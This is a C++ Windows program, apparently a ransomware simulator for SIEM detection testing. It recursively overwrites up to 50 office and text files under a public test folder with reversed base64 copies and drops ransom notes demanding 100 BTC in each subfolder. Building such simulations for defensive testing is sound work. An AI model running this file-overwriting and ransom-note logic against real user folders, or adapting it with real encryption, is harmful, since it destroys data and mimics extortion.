#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <algorithm>

// Log file
std::ofstream logFile("sim_encryption_log.txt");

// Base64 encoding table
const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// Base64 encode helper
std::string base64_encode(const std::string& input) {
    std::string output;
    int val = 0, valb = -6;
    for (unsigned char c : input) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            output.push_back(base64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) output.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (output.size() % 4) output.push_back('=');
    return output;
}

// Simulated encryption: reverse + base64 encode
bool simulate_encrypt_file(const std::string& filepath) {
    std::ifstream in(filepath, std::ios::binary);
    if (!in.is_open()) return false;

    std::string content((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
    in.close();

    std::reverse(content.begin(), content.end());
    std::string encoded = base64_encode(content);

    std::ofstream out(filepath, std::ios::binary | std::ios::trunc);
    if (!out.is_open()) return false;

    out.write(encoded.c_str(), encoded.size());
    out.close();

    logFile << "[+] Encrypted: " << filepath << std::endl;
    return true;
}

// Drop ransom note in folder
void drop_ransom_note(const std::string& folderPath) {
    std::string notePath = folderPath + "\\README_RESTORE_FILES.txt";
    std::ofstream note(notePath);
    note << "Your files have been encrypted (Simulated).\n";
    note << "Send 100 BTC to restore your files.\n";
    note << "This is a simulation for SIEM testing.\n";
    note.close();
    logFile << "[+] Dropped ransom note in: " << folderPath << std::endl;
}

// Recursive file traversal using WinAPI
void encrypt_directory(const std::string& basePath, int& fileCount, int maxFiles = 50) {
    std::string searchPath = basePath + "\\*";
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        std::string name = fd.cFileName;

        if (name == "." || name == "..") continue;

        std::string fullPath = basePath + "\\" + name;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            drop_ransom_note(fullPath);
            encrypt_directory(fullPath, fileCount, maxFiles);
        } else {
            std::string ext = fullPath.substr(fullPath.find_last_of('.'));
            if (ext == ".txt" || ext == ".docx" || ext == ".xlsx" || ext == ".pdf") {
                if (simulate_encrypt_file(fullPath)) {
                    fileCount++;
                    if (fileCount >= maxFiles) {
                        FindClose(hFind);
                        return;
                    }
                }
            }
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
}

int main() {
    logFile << "[*] Starting ransomware simulation...\n";

    // ⚠️ Only use a test-safe directory here!
    std::string rootPath = "C:\\Users\\Public\\simulation";

    int fileCount = 0;
    encrypt_directory(rootPath, fileCount);

    logFile << "[*] Simulation complete. Files processed: " << fileCount << "\n";
    logFile.close();

    return 0;
}
